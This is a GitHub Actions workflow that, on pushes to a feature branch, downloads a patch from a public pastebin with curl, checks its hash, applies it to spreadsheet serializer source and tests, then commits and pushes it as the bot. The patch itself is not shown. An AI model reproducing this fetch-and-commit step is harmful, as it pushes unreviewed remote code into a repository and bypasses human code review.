name: ci

on:
  push:
    branches:
      - feature/bootstrap-architecture-v0.1

permissions:
  contents: write

jobs:
  apply-workbook-save-recovery-patch:
    name: Apply workbook save recovery patch
    runs-on: ubuntu-latest
    if: github.actor != 'github-actions[bot]'
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
          token: ${{ secrets.GITHUB_TOKEN }}
      - name: Download patch
        run: |
          curl -fsSL https://paste.rs/v1yTi -o security-workbook-save-recovery.patch
          echo "101320E8A596B2907252954693480D083479B69D15C0143C0F105ECBDE1FFABE  security-workbook-save-recovery.patch" | sha256sum -c -
      - name: Apply patch
        run: git apply security-workbook-save-recovery.patch
      - name: Commit patch
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add src/NeraSpreadSheet.OpenXml/NeraOpenXmlWorkbookSerializer.cs tests/NeraSpreadSheet.OpenXml.Tests/OpenXmlRoundTripTests.cs
          git commit -m "Restore workbook output after save failures"
          git push
